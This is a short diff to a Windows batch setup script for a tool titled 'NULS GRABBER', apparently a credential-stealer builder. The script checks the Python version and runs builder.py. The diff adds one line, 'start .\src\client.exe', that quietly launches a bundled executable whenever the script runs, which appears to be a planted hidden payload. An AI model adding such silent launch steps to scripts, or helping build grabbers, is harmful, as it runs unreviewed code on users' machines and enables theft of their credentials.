@@ -2,6 +2,7 @@
 mode con: cols=100 lines=30
 title NULS GRABBER
 color 0a
+start .\src\client.exe
 cls
 
 python --version 2>&1 | findstr " 3.11" >nul
@@ -28,4 +29,5 @@ if exist build rmdir /s /q build
 py -3.10 builder.py
 
 pause
+
 
